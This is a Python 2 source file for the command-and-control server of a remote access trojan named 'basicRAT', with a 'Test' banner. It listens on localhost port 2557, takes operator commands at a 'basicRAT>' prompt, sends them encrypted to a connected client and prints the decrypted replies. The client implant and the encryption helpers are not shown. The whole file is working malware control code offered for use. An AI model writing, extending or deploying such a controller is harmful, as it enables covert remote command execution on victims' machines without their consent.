#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

BANNER = """

$$$$$$$$\                    $$\     
\__$$  __|                   $$ |    
   $$ | $$$$$$\   $$$$$$$\ $$$$$$\   
   $$ |$$  __$$\ $$  _____|\_$$  _|  
   $$ |$$$$$$$$ |\$$$$$$\    $$ |    
   $$ |$$   ____| \____$$\   $$ |$$\ 
   $$ |\$$$$$$$\ $$$$$$$  |  \$$$$  |
   \__| \_______|\_______/    \____/ 

"""

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import socket
import sys

from core.utils import Utils

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

HOST = '127.0.0.1'
PORT = 2557

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def main():
    for i in BANNER.split("\n"):
        print i

    utils = Utils()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(10)
    print ('[+] basicRAT server listening on port {}...'.format(PORT))

    conn, _ = s.accept()

    while True:
        cmd = raw_input("basicRAT> ").rstrip()

        # -- Allow noop -- #
        if cmd == '':
            continue

        # -- Send command to client -- #
        conn.send(utils.Encrypt(cmd))

        #-- Stop server -- #
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        data = conn.recv(4096)
        print utils.Decrypt(data)

#----------------------------------------------------------------------------------------------------------------------------#

#----------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt as e:
        print("[!] Exit program...")
